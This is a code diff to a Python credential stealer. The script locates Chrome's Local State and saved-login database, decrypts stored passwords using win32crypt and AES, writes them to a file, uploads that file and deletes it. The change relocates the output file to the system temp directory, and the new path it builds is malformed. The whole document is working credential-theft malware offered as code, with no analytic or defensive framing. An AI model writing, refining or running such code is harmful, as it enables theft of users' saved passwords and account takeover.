@@ -8,8 +8,13 @@ import win32crypt
 from Cryptodome.Cipher import AES
 import shutil
 import requests
+import tempfile
 
-temp_file = open('text.txt','w')
+temp_dir = tempfile.gettempdir()
+
+tmpdir = f"Temporary directory: {temp_dir}"
+tmpfile = os.path.join(tmpdir,'text.txt')
+temp_file = open(tmpfile,'w')
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
 
@@ -26,7 +31,6 @@ def get_secret_key():
         print("%s"%str(e))
         print("[ERR] Chrome secretkey cannot be found")
         return None
-    
 def decrypt_payload(cipher, payload):
     return cipher.decrypt(payload)
 
@@ -86,13 +90,8 @@ if __name__ == '__main__':
                 cursor.close()
                 conn.close()
                 os.remove("Loginvault.db")
-        name = 'text.txt'
         temp_file.close()
-        upload(name)
-        os.remove(name)
+        upload(tmpfile)
+        os.remove(tmpfile)
     except IOError as e:
         print("[ERR] %s"%str(e))
-
-
-
-
